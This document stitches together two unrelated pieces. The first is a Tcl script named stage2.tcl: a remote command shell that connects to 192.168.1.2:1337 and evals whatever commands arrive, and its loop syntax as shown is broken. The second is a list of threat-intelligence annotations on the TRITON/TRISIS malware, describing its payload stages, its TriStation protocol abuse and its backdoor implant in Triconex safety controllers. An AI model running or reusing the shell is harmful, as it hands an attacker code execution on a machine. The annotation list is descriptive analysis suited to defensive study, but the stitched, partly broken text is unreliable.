# ./tcl/stage2.tcl
set sockid [ socket "192.168.1.2" 1337]
while {1}
    flush $sockid
    set line   [gets $sockid]
    catch {eval $line} cmdres
    puts $sockid $cmdres
close $sockid

fully_described_observables.observable_value: TRITON (also referred to as TRISIS or HatMan)
fully_described_observables.notes: A malware framework targeting industrial safety systems; includes known aliases.
Specifically the Triconex line of industrial safety systems targeted in the attack.
A framework targeting industrial safety controllers, deployed against at least one victim in the Middle East.
Refers to the specific safety controllers targeted by TRITON.
A proprietary protocol used by Triconex controllers, mentioned as a barrier removed by TRITON.
One of the few publicly known examples of malware targeting Industrial Control Systems (ICS), specifically industrial safety controllers.
A well-known malware targeting ICS, mentioned alongside TRITON.
A known malware targeting ICS environments, listed in the report.
Mentioned as one of the specific malware examples targeting ICS.
Listed as a malware known for targeting industrial control systems.
Benign log reviewing application used to disguise the TRITON framework.
Payload file injected into the controller program memory.
Secondary payload file injected into the controller program memory.
Framework used to reprogram target safety controllers and capable of autodiscovery via UDP broadcast.
Proprietary and undocumented protocol used to communicate with Triconex controllers.
Port used by TRITON for sending UDP broadcast messages for autodiscovery of controllers (although this functionality was not used during the incident).
Engineering workstation running Microsoft Windows that was remotely accessed by the attacker.
Safety controllers that were reprogrammed using payloads via the TriStation protocol.
Documented protocol referenced during the reverse-engineering of the TriStation protocol.
A product line of safety controllers that includes Tricon (CX), Trident, and Tri-GP systems with triple modular redundancy (TMR) architecture.
Specifically targeted by the incident.
Unauthenticated protocol whose (ab)use is identified as the heart of the attack.
High-speed proprietary communications bus consisting of three independent serial links used for hardware voting and synchronization among Main Processors.
Acts as an interface between a Tricon controller and a Foxboro Intelligent Automation (I/A) Series DCS.
Serves as an interface between a Tricon controller and a Honeywell TDC-3000 control system.
Allows communications with TriStation, other Triconex controllers, Modbus master/slave devices and external hosts over Ethernet networks.
Malicious framework whose payload injected into the controllers enabled subsequent modifications regardless of key switch position.
Contains PowerPC shellcode; one of the payload files associated with the TRITON incident.
The only Triconex Main Processor module known to use the PowerPC architecture and run the ETSX firmware.
Used in the Tricon 3008 Main Processor Module; relevant for analyzing the PowerPC shellcode payloads.
Firmware manager executable used to upgrade the firmware over Ethernet on Tricon 3008 controllers.
Used for developing and debugging the control program as well as downloading it to the controller via the TriStation protocol.
Firmware stored in flash that executes the control program on the Tricon 3008 Main Processor Module.
Contains named lookup constants for TriStation protocol function and response codes as well as key switch and control program states.
High-level interface for reading and writing functions and programs, including a function (SofeAppendProgramMod) for appending shellcode and handling CRC32 checksums.
Acts as a translation layer between the high-level interface and the low-level TriStation function codes and data formatting.
Implements the functionality to send TriStation packets over UDP and includes auto-discovery of Tricon controllers via a UDP 'ping' broadcast message.
Script that uses the framework to connect to a Tricon controller and inject a multi-stage payload.
Used for auto-discovery of Tricon controllers by broadcasting a specific UDP packet.
UDP-based serial-over-ethernet protocol with defined function and response codes used in industrial control systems.
Command used in the TriStation protocol; arguments: 'fold_name', 'version info', 'new_name', 'program info'.
Command with arguments: [id] [next] [full_chunks] [offset] [len] [data].
Command used to communicate with the implant after injection; arguments include [cmd] [mp] [data].
Default password specified for TriStation project access; stored in the project file and used for controller connection.
Model that supports IP-based client access control lists for resource protection.
Model that supports IP-based client access control lists for resource protection.
Second stage shellcode binary functioning as an implant installer; currently not publicly available.
Third stage shellcode binary functioning as a backdoor implant capable of receiving and executing further payloads.
Cleaned-up pseudo-C code representing shellcode that scans memory and writes an attacker-supplied value to the CP Status structure.
Second-stage shellcode binary used as part of the attack.
Implant installer which relocates the imain.bin backdoor into the Enhanced Triconex System Executive (ETSX).
Backdoor file sandwiched between markers (0x1234 and 0x56789A) and length fields.
Function used to inject inject.bin and imain.bin payloads.
First hex marker surrounding imain.bin.
Second hex marker surrounding imain.bin.
Component of the safety controller memory manipulated by the implant installer.
Backdoor implant binary that provides read/write/execute access to safety controller memory.
Command executed prior to the actual handler; used to extract a command value and its arguments.
Function used by the TRITON framework to write exploit data to ROM.
Function used by the TRITON framework to execute code.
Central function that sends a TriStation diagnostic command with a crafted packet to execute the exploit.
Macro defining the command for reading from RAM in the implant code.
